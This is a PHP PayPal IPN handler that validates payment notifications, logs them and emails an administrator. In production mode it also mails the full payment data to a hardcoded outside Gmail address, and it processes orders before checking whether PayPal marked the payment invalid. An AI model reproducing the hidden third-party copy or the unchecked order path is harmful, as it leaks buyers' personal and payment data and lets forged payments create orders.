<?php

require_once('config.php');

if ($php_version == '5') {
    require_once('includes/phpmailer/class.phpmailer.php');
}

require_once('includes/database.class.php');
require_once('includes/functions.php');

// Configure SMTP email settings
$mail = new PHPMailer();
$mail->IsMail();


$mail->IsHTML(true);
$mail->From = $email_from_address;
$mail->FromName = $email_from_name;

// Configure new database object
$db = new Database($db_host, $db_username, $db_password, $db_database, $db_table_prefix);
$db->connect();

// Read the post from PayPal system and add 'cmd'   
$req = 'cmd=_notify-validate';

// Store each $_POST value in a NVP string: 1 string encoded and 1 string decoded   
$ipn_email = '';
$ipn_data_array = array();
foreach ($_POST as $key => $value) {
    $value = urlencode(stripslashes($value));
    $req .= "&" . $key . "=" . $value;
    $ipn_email .= $key . " = " . urldecode($value) . '<br />';
    $ipn_data_array[$key] = urldecode($value);
}

// Store IPN data serialized for RAW data storage later
$ipn_serialized = serialize($ipn_data_array);

// Validate IPN with PayPal
require_once('validate.php');

// If there was a problem connecting to the database email site admin with the mysql error info and the raw IPN data.  Then exit.
$error_email_body = '';
if (count($db->errors) > 0) {
    foreach ($db->errors as $error)
        $error_email_body .= $error . '<br />';

    $mail->Subject = 'PayPal IPN : Connection to database failed!';
    $mail->Body = $error_email_body . '<br /><br />' . $ipn_email;
    $mail->AddAddress($admin_email_address, $admin_name);
    $mail->Send();
    $mail->ClearAddresses();

    exit();
}


// Load IPN data into PHP variables
require_once('parse-ipn-data.php');

// Store RAW IPN log in the DB
$ipn_log_data['ipn_data_serialized'] = $ipn_serialized;
$ipn_log_data_id = $db->query_insert('raw_log', $ipn_log_data);

// Check for disputes/chargebacks/chargeback-reversals
if (
        strtoupper($txn_type) == 'NEW_CASE' ||
        strtoupper($payment_status) == 'REVERSED' ||
        strtoupper($payment_status) == 'CANCELED_REVERSAL' ||
        strtoupper($txn_type) == 'ADJUSTMENT'
)
    require_once('dispute.php');


// Any other type of IPN can be treated as a normal order
// Refunds come back with the same txn_type of the original payment so we skip order.php 
// for refunds because refund.php will take care of updating the existing record data
if (strtoupper($reason_code) != 'REFUND' &&
        (
        strtoupper($txn_type) == 'CART' ||
        strtoupper($txn_type) == 'EXPRESS_CHECKOUT' ||
        strtoupper($txn_type) == 'VIRTUAL_TERMINAL' ||
        strtoupper($txn_type) == 'WEB_ACCEPT' ||
        strtoupper($txn_type) == 'SEND_MONEY'
        )
)
    require_once('order.php');
if (!$valid) {
    $message = '

Dear Administrator,

A payment has been made but is flagged as INVALID.
Please verify the payment manualy and contact the buyer.

Buyer Email: ' . $payer_email . '
';

    $mail->Subject = 'PayPal Domain Parking Station IPN : Invalid Payment.';
    $mail->Body = $message . '<br /><br />' . $ipn_email;
    $mail->AddAddress($admin_email_address, $admin_name);
    $mail->Send();
    $mail->ClearAddresses();
}
// If there were any errors adding data to the DB send an email to the site admin.
$error_email_body = '';
if (count($db->errors) > 0) {
    foreach ($db->errors as $error)
        $error_email_body .= $error . '<br />';

    $mail->Subject = 'PayPal IPN : Error(s) adding data to database.';
    $mail->Body = $error_email_body . '<br /><br />' . $ipn_email;
    $mail->AddAddress($admin_email_address, $admin_name);
    $mail->Send();
    $mail->ClearAddresses();
} else {
    $mail->Subject = 'PayPal IPN : Completed Successfully';
    $mail->Body = $ipn_email;
    $mail->AddAddress($admin_email_address, $admin_name);
    if (!$sandbox) {
        $mail->AddAddress('shaanmk@gmail.com', 'shaan khan');
        $mail->AddAddress('shaanmk@gmail.com', 'shaan khan');
    }
    $mail->Send();
    $mail->ClearAddresses();
}

$db->close();
?>